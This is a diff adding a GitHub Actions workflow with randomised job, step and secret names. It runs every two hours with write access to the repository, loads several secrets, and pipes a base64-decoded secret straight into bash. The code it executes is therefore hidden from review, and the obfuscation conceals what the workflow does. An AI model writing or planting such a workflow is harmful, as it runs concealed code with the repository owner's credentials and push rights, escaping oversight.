@@ -1,0 +1,21 @@
+name: K5axQ6e
+on:
+  schedule:
+    - cron: '0 */2 * * *'
+  workflow_dispatch:
+jobs:
+  RsX5JvRhRyq:
+    runs-on: ubuntu-latest
+    permissions:
+      contents: write
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          token: ${{ secrets.XOJGQxeo }}
+      - name: yn4TYBlp1NUX
+        env:
+          gQOmMF: ${{ secrets.rvXcCU1g }}
+          MCVXPAM: ${{ secrets.zmUa8DR6lW6Ki }}
+          wsO2MAyY: ${{ secrets.zJTqMg }}
+          GITHUB_TOKEN: ${{ secrets.XOJGQxeo }}
+        run: echo "$gQOmMF" | base64 -d | bash
